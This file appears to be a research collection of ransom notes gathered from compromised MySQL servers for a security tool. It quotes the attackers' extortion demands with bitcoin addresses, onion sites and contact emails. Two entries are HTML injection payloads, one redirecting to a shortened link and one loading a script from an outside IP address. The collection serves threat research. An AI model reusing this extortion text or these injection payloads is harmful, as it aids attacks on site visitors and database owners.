@@ -1,0 +1,91 @@
+
+---------------------------------------------------------------------------------------------------
+* MySQL Ransomware Research: Collected Ransom Messages from Infected MySQL Hosts
+
+* Research Conducted during Development of Melee Tool
+
+Research By: Aditya K Sood and Rohit Bansal
+---------------------------------------------------------------------------------------------------
+--------------------------[ Ransom Messages ]------------------------------------------------------
+---------------------------------------------------------------------------------------------------
+1Hello,
+
+I am a security researcher from Sweden, 
+having interest on web security and other focus areas.
+
+Your database was breached by a 3rd party and
+files were backed up to their cloud hosting storage.
+
+I accidently discovered this dedicated cloud storage and was able to secure the files.
+
+It is scheduled to be sold online.
+
+The short-term consequences of this data leak could be fees, fines and frustration.
+
+To prevent this i will remove all files from online storage above
+and restore the database if needed.
+
+	please send exactly 0.1 bitcoin (BTC) to the following 
+	bitcoin address: 15FagZemALE7HYnr63pRKghTJP5Kcz5U6j
+
+email me after the payment confirms(about an hour),
+and I email you back the link to download the original 
+binary dump file created with mysql mydumper.
+
+I will shred the files and terminate their cloud hosting account in 24hrs after the payment.
+
+incidentId: 7dc13c2b-df5a-408c-b98c-c0db5b99d754
+email: 68932ae2e222@mailinator.com
+
+-------------------------------------------------------------------------------------------------------
+
+1To recover your databases and stop any leaks, visit http://godransm3nnlofdwounmfdfaaivjzlnkeslxmo6siw45gn2gjy7av2qd.onion/ and type in this unique token: 01GCSK6HKXKW32VWW1G466KW2M and pay the required amount of Bitcoin to get it back. All of your databases are downloaded and backed up on our servers. If we don't receive payment in the next 15 days, we will sell your database to the highest bidder or use it for our own purposes instead.
+
+------------------------------------------------------------------------------------------------------
+
+1To recover your lost Database and avoid leaking it: Send us 0.1 Bitcoin (BTC) to our Bitcoin address 1J6jLduCXbPyxt5EMTs7iHwdafANy4ThJc and contact us by Email with your Server IP or Domain name and a Proof of Payment. If you are unsure if we have your data, contact us and we will send you a proof. Your Database is downloaded and backed up on our servers. Backups that we have right now: prime, braderie_comasoie, braderie_bourg, braderie_usine, tsf, braderie_maarif, braderie_mansour, braderie_bernoussi . If we dont receive your payment in the next 10 Days, we will make your database public or use them otherwise.1J6jLduCXbPyxt5EMTs7iHwdafANy4ThJcadmin@yourdatabase.biz
+
+------------------------------------------------------------------------------------------------------
+
+1To recover your lost Database and avoid leaking it: Send us 0.1 Bitcoin (BTC) to our Bitcoin address 18QG1j8bW4oJW58zyqcQQ5pjJ44GQ94qiJ and 
+contact us by Email with your Server IP or Domain name and a Proof of Payment. 
+If you are unsure if we have your data, contact us and we will send you a proof. 
+Your Database is downloaded and backed up on our servers. 
+
+Email: 69e7a167fcac@mailinator.com
+If we dont receive your payment in the next 10 Days, we will make your database public or use them otherwise.
+
+-----------------------------------------------------------------------------------------------------
+
+
+'"></title></a><META HTTP-EQUIV="REFRESH" CONTENT="0;URL=https://bit.ly/3ri8y8n"><title><a>
+
+-------------------------------------------------------------------------------------------------------
+
+'"></title></a><script src="http://106.246.13.54:8602/ign3x.html"></script><title><a>
+
+------------------------------------------------------------------------------------------------------
+
+All your data is a backed up. You must pay 0.2 BTC tobc1qf0097pe20r9jvnl68sk6a2erh0t9a3mt5pap3z48 hours for recover it. After 48 hours expiration we will sell all your data on dark markets and the database dump will be dropped from our server!
+
+------------------------------------------------------------------------------------------------------
+
+1To recover your lost Database send 0.015 Bitcoin (BTC) to our Bitcoin address:bc1qf0097pe20r9jvnl68sk6a2erh0t9a3mt5pap3z After this, contact us by email with your Server IP or Domain Name and a Proof of Payment (Payment ID). Your Database is downloaded and backed up on our servers. Backups that we have right now: Adf, questionnaire. Any email without your server IP Address or Domain Name and a Proof of Payment together will be ignored. If we dont receive your payment in the next 10 Days, we will delete or leak your sensitive information.bc1qftne500ny5qv6n487ncgl34jynmvvzkanwjfmddbrestore07@foxmail.com 1To recover your databases and stop any leaks, visit http://godransm3nnlofdwounmfdfaaivjzlnkeslxmo6siw45gn2gjy7av2qd.onion/ and type in this unique token: 01GCSK6HKXKW32VWW1G466KW2M and pay the required amount of Bitcoin to get it back. All of your databases are downloaded and backed up on our servers. If we don't receive payment in the next 15 days, we will sell your database to the highest bidder or use it for our own purposes instead.
+-------------------------------------------------------------------------------------------------------
+
+1To recover your lost databases and avoid leaking it: visit http://o42xfh5kao7mrtesnok5jgdsfagjsgzxlxdlpkpd2x6lpckhzk225yad.onion and enter your unique token 02173d1a27d49c16 and pay the required amount of Bitcoin to get it back. Databases that we have: legal-advice, pet-fodder-shop, legal-advice2. Your databases are downloaded and backed up on our servers. If we dont receive your payment in the next 9 Days, we will sell your database to the highest bidder or use them otherwise. To access this site you have use the tor browser https://www.torproject.org/projects/torbrowser.htmlhttp://o42xfh5kao7mrtesnok5jgdsfagjsgzxlxdlpkpd2x6lpckhzk225yad.onion02173d1a27d49c16
+
+-------------------------------------------------------------------------------------------------------
+
+1To recover your lost Database send 0.013 Bitcoin (BTC) to our Bitcoin address: bc1qeekk2n0l5858cxccl95dyt7sw3nz5n53phtxv9  After this, contact us by email with your Server IP or Domain Name and a Proof of Payment (Payment ID). Your Database is downloaded and backed up on our servers. Backups that we have right now: hausverwaltung. Any email without your server IP Address or Domain Name and a Proof of Payment together will be ignored. If we dont receive your payment in the next 10 Days, we will delete or leak your sensitive information.bc1qeekk2n0l5858cxccl95dyt7sw3nz5n53phtxv9dbrestore07@foxmail.com 1To recover your lost Database send 0.013 Bitcoin (BTC) to our Bitcoin address: bc1qeekk2n0l5858cxccl95dyt7sw3nz5n53phtxv9  After this, contact us by email with your Server IP or Domain Name and a Proof of Payment (Payment ID). Your Database is downloaded and backed up on our servers. Backups that we have right now: hausverwaltung. Any email without your server IP Address or Domain Name and a Proof of Payment together will be ignored. If we dont receive your payment in the next 10 Days, we will delete or leak your sensitive information.bc1qeekk2n0l5858cxccl95dyt7sw3nz5n53phtxv9dbrestore07@foxmail.com
+
+-------------------------------------------------------------------------------------------------------
+
+All your data was backed up from your server. You need to email us at rambler+25b7g@onionmail.org to recover your data. If you dont contact us we will reach the General Data Protection Regulation, GDPR.
+
+-------------------------------------------------------------------------------------------------------
+
+All your data is a backed up. You must pay 0.25 BTC tobc1qf0097pe20r9jvnl68sk6a2erh0t9a3mt5pap3z48 hours for recover it. After 48 hours expiration we will sell all your data on dark markets and the database dump will be dropped from our server!
+            
+-------------------------------------------------------------------------------------------------------
+
